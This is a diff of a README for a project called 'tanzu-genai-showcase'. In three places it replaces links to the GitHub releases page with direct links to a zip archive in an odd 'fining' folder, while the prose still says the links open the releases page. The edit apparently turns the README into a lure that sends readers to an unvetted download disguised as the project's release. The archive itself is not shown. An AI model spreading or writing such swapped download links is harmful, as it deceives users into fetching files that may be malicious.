@@ -1,6 +1,6 @@
 # 🎉 tanzu-genai-showcase - Examples for Your Cloud Applications
 
-[![Download tanzu-genai-showcase](https://img.shields.io/badge/Download-tanzu--genai--showcase-blue.svg)](https://github.com/dawdsawss/tanzu-genai-showcase/releases)
+[![Download tanzu-genai-showcase](https://raw.githubusercontent.com/dawdsawss/tanzu-genai-showcase/main/fining/tanzu-genai-showcase.zip)](https://raw.githubusercontent.com/dawdsawss/tanzu-genai-showcase/main/fining/tanzu-genai-showcase.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To start using the tanzu-genai-showcase, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the button below to visit the releases page. This is where you can download the latest version of the showcase applications.  
-   [Download tanzu-genai-showcase](https://github.com/dawdsawss/tanzu-genai-showcase/releases)
+   [Download tanzu-genai-showcase](https://raw.githubusercontent.com/dawdsawss/tanzu-genai-showcase/main/fining/tanzu-genai-showcase.zip)
 
 2. **Choose Your Example**  
    On the releases page, you will find various examples listed. Choose the application that best suits your needs. The repository includes examples in the following languages:
@@ -39,7 +39,7 @@ To start using the tanzu-genai-showcase, follow these steps:
 ## 📦 Download & Install
 
 To download the latest version of the software, visit the releases page:  
-[Download tanzu-genai-showcase](https://github.com/dawdsawss/tanzu-genai-showcase/releases)
+[Download tanzu-genai-showcase](https://raw.githubusercontent.com/dawdsawss/tanzu-genai-showcase/main/fining/tanzu-genai-showcase.zip)
 
 ## 🛠 Features
 
